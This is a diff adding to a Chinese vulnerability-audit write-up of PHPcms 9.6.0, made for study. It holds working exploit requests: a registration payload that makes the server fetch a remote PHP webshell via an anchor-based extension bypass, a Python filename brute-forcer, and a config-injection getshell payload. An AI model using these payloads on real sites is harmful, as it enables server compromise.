@@ -1,3 +1,5 @@
+[参考链接 PHPcms 9.6.0漏洞审计](https://github.com/SukaraLin/php_code_audit_project/blob/master/phpcms/PHPcms%209.6.0%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1.md)
+
 ## cms组成
 
 `index.php`作为整个cms的入口(包括后台)
@@ -483,3 +485,386 @@ Connection: close
 ```
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png)
+
+## phpcms/modules/member/index.php存在任意文件上传漏洞
+
+在`register`函数中有以下功能
+
+```php
+if ($member_setting['choosemodel']) {
+    require_once CACHE_MODEL_PATH . 'member_input.class.php';
+    require_once CACHE_MODEL_PATH . 'member_update.class.php';
+    $member_input = new member_input($userinfo['modelid']);
+    $_POST['info'] = array_map('new_html_special_chars', $_POST['info']);
+    $user_model_info = $member_input->get($_POST['info']);
+}
+```
+
+到达这一功能点需要构造数据
+
+```
+http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1
+
+POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=123
+```
+
+这里首先对`member_update.class.php`和`member_input.class.php`进行包含,然后实例化了一个`member_input`类,然后调用了`member_input`类中的`get`方法
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png)
+
+注意这里选择的是`caches`目录下的`member_input.class.php`
+
+```php
+function get($data)
+{
+    $this->data = $data = trim_script($data);
+    $model_cache = getcache('member_model', 'commons');
+    $this->db->table_name = $this->db_pre . $model_cache[$this->modelid]['tablename'];
+
+    $info = array();
+    $debar_filed = array('catid', 'title', 'style', 'thumb', 'status', 'islink', 'description');
+    if (is_array($data)) {
+        foreach ($data as $field => $value) {
+            if ($data['islink'] == 1 && !in_array($field, $debar_filed)) continue;
+            $field = safe_replace($field);
+            $name = $this->fields[$field]['name'];
+            $minlength = $this->fields[$field]['minlength'];
+            $maxlength = $this->fields[$field]['maxlength'];
+            $pattern = $this->fields[$field]['pattern'];
+            $errortips = $this->fields[$field]['errortips'];
+            if (empty($errortips)) $errortips = "$name 不符合要求！";
+            $length = empty($value) ? 0 : strlen($value);
+            if ($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
+            if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在' . $field . '字段');
+            if ($maxlength && $length > $maxlength && !$isimport) {
+                showmessage("$name 不得超过 $maxlength 个字符！");
+            } else {
+                str_cut($value, $maxlength);
+            }
+            if ($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
+            if ($this->fields[$field]['isunique'] && $this->db->get_one(array($field => $value), $field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
+            $func = $this->fields[$field]['formtype'];
+            if (method_exists($this, $func)) $value = $this->$func($field, $value);
+
+            $info[$field] = $value;
+        }
+    }
+    return $info;
+}
+```
+
+注意到最后存在这样的语句`if (method_exists($this, $func)) $value = $this->$func($field, $value);`,说明可以通过get方法去调用这个类中的所有方法
+
+而`$func`来源于`$this->fields[$field]['formtype']`,同时在`editor`方法中调用了`attachment::download`,可能可以将远程服务器上的文件下载到本地
+
+```php
+function editor($field, $value)
+{
+    $setting = string2array($this->fields[$field]['setting']);
+    $enablesaveimage = $setting['enablesaveimage'];
+    $site_setting = string2array($this->site_config['setting']);
+    $watermark_enable = intval($site_setting['watermark_enable']);
+    $value = $this->attachment->download('content', $value, $watermark_enable);
+    return $value;
+}
+```
+
+因此在这里构造的payload要满足以下几点
+
+1. `$data`必须是`array`类型,因此`$_POST['info']`必须是`array`类型
+
+2. `$this->fields[$field]['formtype']==editor`而在`caches/caches_model/caches_data/model_field_1.cache.php`,说明`$field`必须等于`content`
+
+```php
+ 'content' => 
+  array (
+    'fieldid' => '8',
+    'modelid' => '1',
+    'siteid' => '1',
+    'field' => 'content',
+    'name' => '内容',
+    ...
+    'errortips' => '内容不能为空',
+    'formtype' => 'editor',
+    ...
+)',
+```
+
+3. 注意存在`$field = safe_replace($field);`,可能需要对其进行绕过
+
+```
+http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1
+
+POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=1&info[content]=valuexxxx
+```
+
+`phpcms/libs/classes/attachment.class.php`
+
+```php
+/**
+ * 附件下载
+ * Enter description here ...
+ * @param $field 预留字段
+ * @param $value 传入下载内容
+ * @param $watermark 是否加入水印
+ * @param $ext 下载扩展名
+ * @param $absurl 绝对路径
+ * @param $basehref 
+ */
+function download($field, $value, $watermark = '0', $ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
+{
+    global $image_d;
+    $this->att_db = pc_base::load_model('attachment_model');
+    $upload_url = pc_base::load_config('system', 'upload_url');
+    $this->field = $field;
+    $dir = date('Y/md/');
+    $uploadpath = $upload_url . $dir;
+    $uploaddir = $this->upload_root . $dir;
+    $string = new_stripslashes($value);
+    if (!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
+    $remotefileurls = array();
+    foreach ($matches[3] as $matche) {
+        if (strpos($matche, '://') === false) continue;
+        dir_create($uploaddir);
+        $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
+    }
+    unset($matches, $string);
+    $remotefileurls = array_unique($remotefileurls);
+    $oldpath = $newpath = array();
+    foreach ($remotefileurls as $k => $file) {
+        if (strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
+        $filename = fileext($file);
+        $file_name = basename($file);
+        $filename = $this->getname($filename);
+
+        $newfile = $uploaddir . $filename;
+        $upload_func = $this->upload_func;//$this->upload_func = 'copy';
+        if ($upload_func($file, $newfile)) {
+            $oldpath[] = $k;
+            $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath . $filename;
+            @chmod($newfile, 0777);
+            $fileext = fileext($filename);
+            if ($watermark) {
+                watermark($newfile, $newfile, $this->siteid);
+            }
+            $filepath = $dir . $filename;
+            $downloadedfile = array('filename' => $filename, 'filepath' => $filepath, 'filesize' => filesize($newfile), 'fileext' => $fileext);
+            $aid = $this->add($downloadedfile);
+            $this->downloadedfiles[$aid] = $filepath;
+        }
+    }
+    return str_replace($oldpath, $newpath, $value);
+}
+```
+
+1. `preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)`而`$ext = 'gif|jpg|jpeg|bmp|png'`,正则匹配检查并提取结果
+
+2. `$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);`
+
+```php
+/**
+ * 补全网址
+ *
+ * @param	string	$surl		源地址
+ * @param	string	$absurl		相对地址
+ * @param	string	$basehref	网址
+ * @return	string	网址
+ */
+function fillurl($surl, $absurl, $basehref = '')
+{
+    if ($basehref != '') {
+        $preurl = strtolower(substr($surl, 0, 6));
+        if ($preurl == 'http://' || $preurl == 'ftp://' || $preurl == 'mms://' || $preurl == 'rtsp://' || $preurl == 'thunde' || $preurl == 'emule://' || $preurl == 'ed2k://')
+            return  $surl;
+        else
+            return $basehref . '/' . $surl;
+    }
+    $i = 0;
+    $dstr = '';
+    $pstr = '';
+    $okurl = '';
+    $pathStep = 0;
+    $surl = trim($surl);
+    if ($surl == '') return '';
+    $urls = @parse_url(SITE_URL);
+    $HomeUrl = $urls['host'];
+    $BaseUrlPath = $HomeUrl . $urls['path'];
+    $BaseUrlPath = preg_replace("/\/([^\/]*)\.(.*)$/", '/', $BaseUrlPath);
+    $BaseUrlPath = preg_replace("/\/$/", '', $BaseUrlPath);
+    $pos = strpos($surl, '#');
+    if ($pos > 0) $surl = substr($surl, 0, $pos);
+    if ($surl[0] == '/') {
+        $okurl = 'http://' . $HomeUrl . '/' . $surl;
+    } elseif ($surl[0] == '.') {
+        if (strlen($surl) <= 2) return '';
+        elseif ($surl[0] == '/') {
+            $okurl = 'http://' . $BaseUrlPath . '/' . substr($surl, 2, strlen($surl) - 2);
+        } else {
+            $urls = explode('/', $surl);
+            foreach ($urls as $u) {
+                if ($u == "..") $pathStep++;
+                else if ($i < count($urls) - 1) $dstr .= $urls[$i] . '/';
+                else $dstr .= $urls[$i];
+                $i++;
+            }
+            $urls = explode('/', $BaseUrlPath);
+            if (count($urls) <= $pathStep)
+                return '';
+            else {
+                $pstr = 'http://';
+                for ($i = 0; $i < count($urls) - $pathStep; $i++) {
+                    $pstr .= $urls[$i] . '/';
+                }
+                $okurl = $pstr . $dstr;
+            }
+        }
+    } else {
+        $preurl = strtolower(substr($surl, 0, 6));
+        if (strlen($surl) < 7)
+            $okurl = 'http://' . $BaseUrlPath . '/' . $surl;
+        elseif ($preurl == "http:/" || $preurl == 'ftp://' || $preurl == 'mms://' || $preurl == "rtsp://" || $preurl == 'thunde' || $preurl == 'emule:' || $preurl == 'ed2k:/')
+            $okurl = $surl;
+        else
+            $okurl = 'http://' . $BaseUrlPath . '/' . $surl;
+    }
+    $preurl = strtolower(substr($okurl, 0, 6));
+    if ($preurl == 'ftp://' || $preurl == 'mms://' || $preurl == 'rtsp://' || $preurl == 'thunde' || $preurl == 'emule:' || $preurl == 'ed2k:/') {
+        return $okurl;
+    } else {
+        $okurl = preg_replace('/^(http:\/\/)/i', '', $okurl);
+        $okurl = preg_replace('/\/{1,}/i', '/', $okurl);
+        return 'http://' . $okurl;
+    }
+}
+```
+
+注意到在`fillurl`存在`$pos = strpos($surl, '#');    if ($pos > 0) $surl = substr($surl, 0, $pos);`用于获取网页锚点前的路径,因此可以利用网页锚点绕过前面正则匹配
+
+`xxx#a.jpg`
+
+```php
+<?php
+$ext = 'gif|jpg|jpeg|bmp|png';
+
+$string="src=http://a.com/a.php#a.jpg";
+
+preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches);
+
+var_dump($matches);
+```
+
+```php
+array(5) {
+  [0]=>
+  array(1) {
+    [0]=>
+    string(28) "src=http://a.com/a.php#a.jpg"
+  }
+  [1]=>
+  array(1) {
+    [0]=>
+    string(3) "src"
+  }
+  [2]=>
+  array(1) {
+    [0]=>
+    string(0) ""
+  }
+  [3]=>
+  array(1) {
+    [0]=>
+    string(24) "http://a.com/a.php#a.jpg"
+  }
+  [4]=>
+  array(1) {
+    [0]=>
+    string(3) "jpg"
+  }
+}
+```
+
+最后利用`$upload_func($file, $newfile)`调用了`copy`从远程端拷贝文件到本地,因此成功在本地保留webshell
+
+```
+http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1
+
+POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=1&info[content]=src=http://a.com/a.php#a.jpg
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png)
+
+本地测试payload
+
+```
+http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1
+
+POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=1&info[content]=src=http://192.168.241.1:8000/a.php#a.jpg
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png)
+
+但由于`rand(100,999)`的存在,需要编写脚本去爆破才能得到具体的文件名
+
+```python
+import requests
+import time
+
+url='http://192.168.241.130:8080/uploadfile/2022/0313/202203130533%s'
+
+for i in range(49000,50000):
+    r=requests.get(url=url%(str(i)+'.php'))
+    if r.status_code==200:
+        print(i)
+        break
+    if i%100==0:
+        time.sleep(5)
+```
+
+## phpsso_server/phpcms/modules/admin/system.php后台getshell
+
+```php
+public function uc()
+{
+    if (isset($_POST['dosubmit'])) {
+        $data = isset($_POST['data']) ? $_POST['data'] : '';
+        $data['ucuse'] = isset($_POST['ucuse']) && intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0;
+        $filepath = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . 'system.php';
+        $config = include $filepath;
+        $uc_config = '<?php ' . "\ndefine('UC_CONNECT', 'mysql');\n";
+        foreach ($data as $k => $v) {
+            $old[] = "'$k'=>'" . (isset($config[$k]) ? $config[$k] : $v) . "',";
+            $new[] = "'$k'=>'$v',";
+            $uc_config .= "define('" . strtoupper($k) . "', '$v');\n";
+        }
+        $html = file_get_contents($filepath);
+        $html = str_replace($old, $new, $html);
+        $uc_config_filepath = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . 'uc_config.php';
+        @file_put_contents($uc_config_filepath, $uc_config);
+        @file_put_contents($filepath, $html);
+        $this->db->insert(array('name' => 'ucenter', 'data' => array2string($data)), 1, 1);
+        showmessage(L('operation_success'), HTTP_REFERER);
+    }
+    $data = array();
+    $r = $this->db->get_one(array('name' => 'ucenter'));
+    if ($r) {
+        $data = string2array($r['data']);
+    }
+    include $this->admin_tpl('system_uc');
+}
+```
+
+```
+http://192.168.241.130:8080/phpsso_server/index.php?m=admin&c=system&a=uc
+
+POST: dosubmit=1&data[asdf','qwer');?><?php phpinfo();?>asdf]=asdf
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png)
